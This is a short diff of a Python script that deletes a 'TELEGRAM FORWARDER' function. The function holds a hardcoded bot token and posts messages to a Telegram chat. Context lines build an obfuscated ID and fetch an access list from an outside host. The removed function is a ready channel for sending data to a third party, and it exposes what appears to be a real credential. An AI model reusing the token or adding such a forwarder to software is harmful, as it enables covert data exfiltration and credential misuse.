@@ -786,13 +786,6 @@ id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
 gxdsid = id1 + spce
 gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text
 
-# TELEGRAM FORWARDER
-def xsndr(xss,message,chat_id):
-    bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8'
-    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-    data = {'chat_id': chat_id, 'text': message}
-    requests.post(url, data=data)
-
 def lxnes():
     print(f"{dg}  ————————————————————————————————————————")
     print(f"{dg}  ————————————————————————————————————————")
